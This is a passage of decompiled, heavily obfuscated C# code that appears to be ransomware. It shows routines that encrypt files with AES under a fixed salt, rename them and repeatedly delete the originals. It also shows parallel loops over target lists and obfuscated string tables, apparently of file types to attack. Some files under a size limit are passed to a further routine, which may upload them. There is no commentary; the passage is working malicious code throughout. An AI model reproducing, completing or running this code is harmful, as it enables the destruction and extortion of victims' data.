									pakacOBHHbOndSfi(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!mcFzFNtJADHq)
									{
										fseJKjvbGESfArR(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, GAYqeKKGxXouZl);
									}
									else
									{
										fseJKjvbGESfArR(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (VZbRouVLPuojXZ)
									{
										try
										{
											File.AppendAllText(wYgKBMneFetPI, GLFJtOHmsMzYg.getString_0(107391238) + CS_0024_003C_003E8__locals0.oZqvHCHaRhG + GLFJtOHmsMzYg.getString_0(107391507) + ex6.Message + GLFJtOHmsMzYg.getString_0(107396688));
										}
										catch (Exception)
										{
										}
									}
									iMHVeSscbXPhxV++;
									return;
								}
							}
						}
						else if (!rdRqmOAazIcaE)
						{
							if (!mcFzFNtJADHq)
							{
								pakacOBHHbOndSfi(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + GLFJtOHmsMzYg.getString_0(107391516), GAYqeKKGxXouZl);
							}
							else
							{
								pakacOBHHbOndSfi(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + GLFJtOHmsMzYg.getString_0(107391516), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!mcFzFNtJADHq)
								{
									fseJKjvbGESfArR(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG, GAYqeKKGxXouZl);
								}
								else
								{
									fseJKjvbGESfArR(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (VZbRouVLPuojXZ)
								{
									try
									{
										File.AppendAllText(wYgKBMneFetPI, GLFJtOHmsMzYg.getString_0(107391238) + CS_0024_003C_003E8__locals0.oZqvHCHaRhG + GLFJtOHmsMzYg.getString_0(107391507) + ex8.Message + GLFJtOHmsMzYg.getString_0(107396688));
									}
									catch (Exception)
									{
									}
								}
								iMHVeSscbXPhxV++;
								return;
							}
						}
						if (mcFzFNtJADHq)
						{
							if (CS_0024_003C_003E8__locals0.dvKbEoMZndICx != GLFJtOHmsMzYg.getString_0(107391489))
							{
								GVeTLYiMKjVRgswna(CS_0024_003C_003E8__locals0.oZqvHCHaRhG + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, bytes2);
							}
							else
							{
								GVeTLYiMKjVRgswna(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			CS_0024_003C_003E8__locals0.DtygzxwTYAXrqA.Remove(CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
		});
	}

	private static void OFfumpuObipK(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (sSOzpOZGePD == getString_0(107396781))
					{
						foreach (string item in NKDXYpykBZuNlnjW)
						{
							if (string_0.ToLower().EndsWith(item) && KuTrHyLgjDea == getString_0(107396781))
							{
								if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393912), getString_0(107393907), getString_0(107393926), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && KuTrHyLgjDea == getString_0(107396786))
							{
								try
								{
									IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393912), getString_0(107393907), getString_0(107393926), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107391499)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107391499), getString_0(107393351)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void fseJKjvbGESfArR(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (sSOzpOZGePD == getString_0(107396781))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in NKDXYpykBZuNlnjW)
			{
				if (string_0.ToLower().EndsWith(item) && KuTrHyLgjDea == getString_0(107396781))
				{
					if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393912), getString_0(107393907), getString_0(107393926), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && KuTrHyLgjDea == getString_0(107396786))
				{
					try
					{
						IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393912), getString_0(107393907), getString_0(107393926), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = oxCCkthrujAUT.CHDPlpVwKhLj(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		qmtbLhoLXOw++;
	}

	private static void pakacOBHHbOndSfi(string string_0, string string_1, byte[] byte_0)
	{
		iApXHykdLayy CS_0024_003C_003E8__locals0 = new iApXHykdLayy();
		CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE = string_0;
		CS_0024_003C_003E8__locals0.XWzkEgaHSEw = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string xWzkEgaHSEw = CS_0024_003C_003E8__locals0.XWzkEgaHSEw;
			FileStream fileStream = new FileStream(xWzkEgaHSEw, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (BfbuIxbfjKDpupL == getString_0(107396781))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.XWzkEgaHSEw.Length > 0)
				{
					if (sSOzpOZGePD == getString_0(107396781))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in NKDXYpykBZuNlnjW)
						{
							if (CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE.ToLower().EndsWith(item) && KuTrHyLgjDea == getString_0(107396781))
							{
								if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393912), getString_0(107393907), getString_0(107393926), CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE.ToLower().EndsWith(item) && KuTrHyLgjDea == getString_0(107396786))
							{
								try
								{
									IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393912), getString_0(107393907), getString_0(107393926), CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.XWzkEgaHSEw.EndsWith(getString_0(107391499)))
					{
						File.Move(CS_0024_003C_003E8__locals0.XWzkEgaHSEw, CS_0024_003C_003E8__locals0.XWzkEgaHSEw.Replace(getString_0(107391499), getString_0(107393351)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.XWzkEgaHSEw))
							{
								File.Delete(CS_0024_003C_003E8__locals0.XWzkEgaHSEw);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (VZbRouVLPuojXZ)
			{
				try
				{
					File.AppendAllText(wYgKBMneFetPI, getString_0(107391221) + CS_0024_003C_003E8__locals0.WYKjJWbWQDJeE + getString_0(107391490) + ex2.Message + getString_0(107396671));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = taliprOMnTGcFw;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				YoVGDQybWWFICjtj(getString_0(107391405), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> source2 = tNdkdYtjHRONCbo;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				YoVGDQybWWFICjtj(getString_0(107391428), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> source3 = vNfHqpeGUAcgE;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107391383)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (EklUJCblWElDEp == getString_0(107396781))
		{
			string[] source4 = gKargFodTWtGS;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107391383)), getString_0(107391390) + string_0 + getString_0(107391349));
				};
			}
			Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!hwYAdwGTOvJd().Contains(getString_0(107391087)))
		{
			NNMJoJWcluCtznb(kjQmlqzYIQVD);
		}
		else
		{
			List<string> lnSJjOAshqQA = LnSJjOAshqQA;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					YoVGDQybWWFICjtj(MltDPGcncVSc(ViJjhZRbVgIOJj(getString_0(107391344))), string_0);
				};
			}
			Parallel.ForEach(lnSJjOAshqQA, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> mWOoiLgPzdCBQo = MWOoiLgPzdCBQo;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107390807)), string_0);
			};
		}
		Parallel.ForEach(mWOoiLgPzdCBQo, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> wbVfESprDIGIMr = WbVfESprDIGIMr;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				YoVGDQybWWFICjtj(getString_0(107390822), string_0);
			};
		}
		Parallel.ForEach(wbVfESprDIGIMr, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		YoVGDQybWWFICjtj(getString_0(107391405), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		YoVGDQybWWFICjtj(getString_0(107391428), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107391383)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107391383)), getString_0(107391390) + string_0 + getString_0(107391349));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		YoVGDQybWWFICjtj(MltDPGcncVSc(ViJjhZRbVgIOJj(getString_0(107391344))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107390807)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		YoVGDQybWWFICjtj(getString_0(107390822), string_0);
	}

	static QxgtRZDqToQ()
	{
		Strings.CreateGetStringDelegate(typeof(QxgtRZDqToQ));
		PaqQKLIfcahgkkJ = getString_0(107390813);
		GAYqeKKGxXouZl = null;
		vnjAAOWySSxKeZlz = getString_0(107396786);
		WszmglDXIZxoiW = getString_0(107390772);
		GihwuaHpSXPKUIVR = new List<string>();
		qonXfYAFKmjr = new List<string>();
		mzBGqUfZtpJZO = getString_0(107396786);
		rXvEUmxLKNoI = getString_0(107393351);
		XKBARtNChmtca = getString_0(107393351);
		PctqfzqnuYN = getString_0(107396786);
		LoAczHkdcIMTHN = 0;
		YFOyrvZGGOG = getString_0(107396786);
		jZGJiISxTeIH = getString_0(107396786);
		JwhvfsUfaFd = getString_0(107396786);
		xtSgYwxUPlY = getString_0(107390791);
		NHvePyMARlelvv = getString_0(107396786);
		ZRYCSuLapUWm = getString_0(107396786);
		KbPWXaxyGiw = getString_0(107396786);
		ofHnrODMqYEFdaB = getString_0(107396786);
		WyzZZAaYjHUsongS = new List<string>
		{
			MltDPGcncVSc(getString_0(107390786)),
			MltDPGcncVSc(getString_0(107390737)),
			MltDPGcncVSc(getString_0(107390712)),
			MltDPGcncVSc(getString_0(107390727)),
			MltDPGcncVSc(getString_0(107390670)),
			MltDPGcncVSc(getString_0(107390645)),
			MltDPGcncVSc(getString_0(107390660)),
			MltDPGcncVSc(getString_0(107390635)),
			MltDPGcncVSc(getString_0(107390578)),
			MltDPGcncVSc(getString_0(107391065)),
			MltDPGcncVSc(getString_0(107391080)),
			MltDPGcncVSc(getString_0(107391023)),
			MltDPGcncVSc(getString_0(107390998))
		};
		juoIXWLeiNsyc = new List<string>();
		VbScYDiqPLft = getString_0(107396786);
		DQqsrNGhOoSM = getString_0(107396786);
		vEhrBRNFub = getString_0(107396786);
		CRTChqfNsauJEL = new List<string>();
		YWzKNQYtYMLj = getString_0(107396786);
		pthiKiitPeDipqY = getString_0(107391005);
		bqciLIMtJOIROzlgHA = getString_0(107396786);
		PxRjSGbBLpTbn = getString_0(107396786);
		tNdkdYtjHRONCbo = new List<string>
		{
			MltDPGcncVSc(getString_0(107390924)),
			MltDPGcncVSc(getString_0(107390923)),
			MltDPGcncVSc(getString_0(107390890)),
			MltDPGcncVSc(getString_0(107390857)),
			MltDPGcncVSc(getString_0(107390312)),
			MltDPGcncVSc(getString_0(107390283)),
			MltDPGcncVSc(getString_0(107390194)),
			MltDPGcncVSc(getString_0(107390165)),
			MltDPGcncVSc(getString_0(107390152)),
			MltDPGcncVSc(getString_0(107390087)),
			MltDPGcncVSc(getString_0(107390566)),
			MltDPGcncVSc(getString_0(107390533)),
			MltDPGcncVSc(getString_0(107390500)),
			MltDPGcncVSc(getString_0(107390471)),
			MltDPGcncVSc(getString_0(107390442)),
			MltDPGcncVSc(getString_0(107390401)),
			MltDPGcncVSc(getString_0(107390328)),
			MltDPGcncVSc(getString_0(107389791)),
			MltDPGcncVSc(getString_0(107389710)),
			MltDPGcncVSc(getString_0(107389677)),
			MltDPGcncVSc(getString_0(107389648)),
			MltDPGcncVSc(getString_0(107389639)),
			MltDPGcncVSc(getString_0(107389598)),
			MltDPGcncVSc(getString_0(107389565)),
			MltDPGcncVSc(getString_0(107389996)),
			MltDPGcncVSc(getString_0(107389939)),
			MltDPGcncVSc(getString_0(107389930)),
			MltDPGcncVSc(getString_0(107389869)),
			MltDPGcncVSc(getString_0(107389860)),
			MltDPGcncVSc(getString_0(107389291)),
			MltDPGcncVSc(getString_0(107389226)),
			MltDPGcncVSc(getString_0(107389137)),
			MltDPGcncVSc(getString_0(107389072)),
			MltDPGcncVSc(getString_0(107389055)),
			MltDPGcncVSc(getString_0(107389502)),
			MltDPGcncVSc(getString_0(107389445)),
			MltDPGcncVSc(getString_0(107389412)),
			MltDPGcncVSc(getString_0(107389339)),
			MltDPGcncVSc(getString_0(107389298)),
			MltDPGcncVSc(getString_0(107388773)),
			MltDPGcncVSc(getString_0(107388744)),
			MltDPGcncVSc(getString_0(107388679)),
			MltDPGcncVSc(getString_0(107388638)),
			MltDPGcncVSc(getString_0(107388605)),
			MltDPGcncVSc(getString_0(107388532)),
			MltDPGcncVSc(getString_0(107389027)),
			MltDPGcncVSc(getString_0(107388950)),
			MltDPGcncVSc(getString_0(107388877)),
			MltDPGcncVSc(getString_0(107388864)),
			MltDPGcncVSc(getString_0(107388787)),
			MltDPGcncVSc(getString_0(107388262)),
			MltDPGcncVSc(getString_0(107388221)),
			MltDPGcncVSc(getString_0(107388116)),
			MltDPGcncVSc(getString_0(107388087)),
			MltDPGcncVSc(getString_0(107388046)),
			MltDPGcncVSc(getString_0(107388493)),
			MltDPGcncVSc(getString_0(107388480)),
			MltDPGcncVSc(getString_0(107388451)),
			MltDPGcncVSc(getString_0(107388374)),
			MltDPGcncVSc(getString_0(107388309)),
			MltDPGcncVSc(getString_0(107388280)),
			MltDPGcncVSc(getString_0(107387743)),
			MltDPGcncVSc(getString_0(107387678)),
			MltDPGcncVSc(getString_0(107387605)),
			MltDPGcncVSc(getString_0(107387576)),
			MltDPGcncVSc(getString_0(107387535)),
			MltDPGcncVSc(getString_0(107387998)),
			MltDPGcncVSc(getString_0(107387937)),
			MltDPGcncVSc(getString_0(107387832)),
			MltDPGcncVSc(getString_0(107387819)),
			MltDPGcncVSc(getString_0(107387786)),
			MltDPGcncVSc(getString_0(107387233)),
			MltDPGcncVSc(getString_0(107387124)),
			MltDPGcncVSc(getString_0(107387111)),
			MltDPGcncVSc(getString_0(107386990)),
			MltDPGcncVSc(getString_0(107387485)),
			MltDPGcncVSc(getString_0(107387456)),
			MltDPGcncVSc(getString_0(107387383)),
			MltDPGcncVSc(getString_0(107387318)),
			MltDPGcncVSc(getString_0(107387301)),
			MltDPGcncVSc(getString_0(107386700)),
			MltDPGcncVSc(getString_0(107386699)),
			MltDPGcncVSc(getString_0(107386606)),
			MltDPGcncVSc(getString_0(107386549)),
			MltDPGcncVSc(getString_0(107389445)),
			MltDPGcncVSc(getString_0(107386524)),
			MltDPGcncVSc(getString_0(107386963)),
			MltDPGcncVSc(getString_0(107386874)),
			MltDPGcncVSc(getString_0(107386829)),
			MltDPGcncVSc(getString_0(107386768)),
			MltDPGcncVSc(getString_0(107386743)),
			MltDPGcncVSc(getString_0(107386218)),
			MltDPGcncVSc(getString_0(107386137)),
			MltDPGcncVSc(getString_0(107389291)),
			MltDPGcncVSc(getString_0(107386072)),
			MltDPGcncVSc(getString_0(107386031)),
			MltDPGcncVSc(getString_0(107385974)),
			MltDPGcncVSc(getString_0(107389226)),
			MltDPGcncVSc(getString_0(107386413)),
			MltDPGcncVSc(getString_0(107386396)),
			MltDPGcncVSc(getString_0(107386307)),
			MltDPGcncVSc(getString_0(107386242)),
			MltDPGcncVSc(getString_0(107385649)),
			MltDPGcncVSc(getString_0(107389072)),
			MltDPGcncVSc(getString_0(107385604)),
			MltDPGcncVSc(getString_0(107389412)),
			MltDPGcncVSc(getString_0(107389055)),
			MltDPGcncVSc(getString_0(107385571)),
			MltDPGcncVSc(getString_0(107385514)),
			MltDPGcncVSc(getString_0(107389502)),
			MltDPGcncVSc(getString_0(107385481)),
			MltDPGcncVSc(getString_0(107385912)),
			MltDPGcncVSc(getString_0(107385895)),
			MltDPGcncVSc(getString_0(107389860)),
			MltDPGcncVSc(getString_0(107385838)),
			MltDPGcncVSc(getString_0(107385825)),
			MltDPGcncVSc(getString_0(107385796)),
			MltDPGcncVSc(getString_0(107385767)),
			MltDPGcncVSc(getString_0(107385178)),
			MltDPGcncVSc(getString_0(107385145)),
			MltDPGcncVSc(getString_0(107385152)),
			MltDPGcncVSc(getString_0(107385075)),
			MltDPGcncVSc(getString_0(107385050)),
			MltDPGcncVSc(getString_0(107385009)),
			MltDPGcncVSc(getString_0(107384996)),
			MltDPGcncVSc(getString_0(107385427)),
			MltDPGcncVSc(getString_0(107385370)),
			MltDPGcncVSc(getString_0(107385337)),
			MltDPGcncVSc(getString_0(107385292)),
			MltDPGcncVSc(getString_0(107385291)),
			MltDPGcncVSc(getString_0(107385250)),
			MltDPGcncVSc(getString_0(107389869)),
			MltDPGcncVSc(getString_0(107385427)),
			MltDPGcncVSc(getString_0(107384665)),
			MltDPGcncVSc(getString_0(107384668)),
			MltDPGcncVSc(getString_0(107384639)),
			MltDPGcncVSc(getString_0(107384558)),
			MltDPGcncVSc(getString_0(107384549)),
			MltDPGcncVSc(getString_0(107384488)),
			MltDPGcncVSc(getString_0(107384927)),
			MltDPGcncVSc(getString_0(107384898)),
			MltDPGcncVSc(getString_0(107384865)),
			MltDPGcncVSc(getString_0(107384760)),
			MltDPGcncVSc(getString_0(107384731)),
			MltDPGcncVSc(getString_0(107384686)),
			MltDPGcncVSc(getString_0(107384109)),
			MltDPGcncVSc(getString_0(107384076)),
			MltDPGcncVSc(getString_0(107384063)),
			MltDPGcncVSc(getString_0(107384002)),
			MltDPGcncVSc(getString_0(107383969)),
			MltDPGcncVSc(getString_0(107384404)),
			MltDPGcncVSc(getString_0(107384339)),
			MltDPGcncVSc(getString_0(107384306)),
			MltDPGcncVSc(getString_0(107384297)),
			MltDPGcncVSc(getString_0(107384216)),
			MltDPGcncVSc(getString_0(107389996)),
			MltDPGcncVSc(getString_0(107384187)),
			MltDPGcncVSc(getString_0(107383650)),
			MltDPGcncVSc(getString_0(107383577)),
			MltDPGcncVSc(getString_0(107383532)),
			MltDPGcncVSc(getString_0(107383523)),
			MltDPGcncVSc(getString_0(107383446)),
			MltDPGcncVSc(getString_0(107383897)),
			MltDPGcncVSc(getString_0(107383880)),
			MltDPGcncVSc(getString_0(107383799)),
			MltDPGcncVSc(getString_0(107383774)),
			MltDPGcncVSc(getString_0(107383717)),
			MltDPGcncVSc(getString_0(107383128)),
			MltDPGcncVSc(getString_0(107383087)),
			MltDPGcncVSc(getString_0(107383030)),
			MltDPGcncVSc(getString_0(107389939)),
			MltDPGcncVSc(getString_0(107382957)),
			MltDPGcncVSc(getString_0(107382928)),
			MltDPGcncVSc(getString_0(107382895)),
			MltDPGcncVSc(getString_0(107383398)),
			MltDPGcncVSc(getString_0(107383369)),
			MltDPGcncVSc(getString_0(107389565)),
			MltDPGcncVSc(getString_0(107383328)),
			MltDPGcncVSc(getString_0(107383247)),
			MltDPGcncVSc(getString_0(107383218)),
			MltDPGcncVSc(getString_0(107388280)),
			MltDPGcncVSc(getString_0(107383185)),
			MltDPGcncVSc(getString_0(107383218)),
			MltDPGcncVSc(getString_0(107383156)),
			MltDPGcncVSc(getString_0(107382615)),
			MltDPGcncVSc(getString_0(107382586)),
			MltDPGcncVSc(getString_0(107382569)),
			MltDPGcncVSc(getString_0(107382488)),
			MltDPGcncVSc(getString_0(107382447)),
			MltDPGcncVSc(getString_0(107382386)),
			MltDPGcncVSc(getString_0(107382869)),
			MltDPGcncVSc(getString_0(107382828)),
			MltDPGcncVSc(getString_0(107382815)),
			MltDPGcncVSc(getString_0(107382738)),
			MltDPGcncVSc(getString_0(107382705)),
			MltDPGcncVSc(getString_0(107382648)),
			MltDPGcncVSc(getString_0(107382123)),
			MltDPGcncVSc(getString_0(107382034)),
			MltDPGcncVSc(getString_0(107382001)),
			MltDPGcncVSc(getString_0(107381992)),
			MltDPGcncVSc(getString_0(107381963)),
			MltDPGcncVSc(getString_0(107381870)),
			MltDPGcncVSc(getString_0(107382349)),
			MltDPGcncVSc(getString_0(107382292)),
			MltDPGcncVSc(getString_0(107382283)),
			MltDPGcncVSc(getString_0(107382202)),
			MltDPGcncVSc(getString_0(107382169)),
			MltDPGcncVSc(getString_0(107382152)),
			MltDPGcncVSc(getString_0(107381563)),
			MltDPGcncVSc(getString_0(107381546)),
			MltDPGcncVSc(getString_0(107381501)),
			MltDPGcncVSc(getString_0(107381420)),
			MltDPGcncVSc(getString_0(107381419)),
			MltDPGcncVSc(getString_0(107381378)),
			MltDPGcncVSc(getString_0(107381817)),
			MltDPGcncVSc(getString_0(107381772)),
			MltDPGcncVSc(getString_0(107384549)),
			MltDPGcncVSc(getString_0(107381771)),
			MltDPGcncVSc(getString_0(107381730)),
			MltDPGcncVSc(getString_0(107381673)),
			MltDPGcncVSc(getString_0(107381612)),
			MltDPGcncVSc(getString_0(107381099)),
			MltDPGcncVSc(getString_0(107381066)),
			MltDPGcncVSc(getString_0(107380985)),
			MltDPGcncVSc(getString_0(107380988)),
			MltDPGcncVSc(getString_0(107380911)),
			MltDPGcncVSc(getString_0(107380898)),
			MltDPGcncVSc(getString_0(107381337)),
			MltDPGcncVSc(getString_0(107381312)),
			MltDPGcncVSc(getString_0(107381231)),
			MltDPGcncVSc(getString_0(107381202)),
			MltDPGcncVSc(getString_0(107381189))
		};
		taliprOMnTGcFw = new List<string>
		{
			MltDPGcncVSc(getString_0(107381148)),
			MltDPGcncVSc(getString_0(107413355)),
			MltDPGcncVSc(getString_0(107413274)),
			MltDPGcncVSc(getString_0(107413257)),
			MltDPGcncVSc(getString_0(107413176)),
			MltDPGcncVSc(getString_0(107413111)),
			MltDPGcncVSc(getString_0(107413578)),
			MltDPGcncVSc(getString_0(107413485))
		};
		vNfHqpeGUAcgE = new List<string>
		{
			MltDPGcncVSc(getString_0(107413428)),
			MltDPGcncVSc(getString_0(107413395)),
			MltDPGcncVSc(getString_0(107413382)),
			MltDPGcncVSc(getString_0(107412789)),
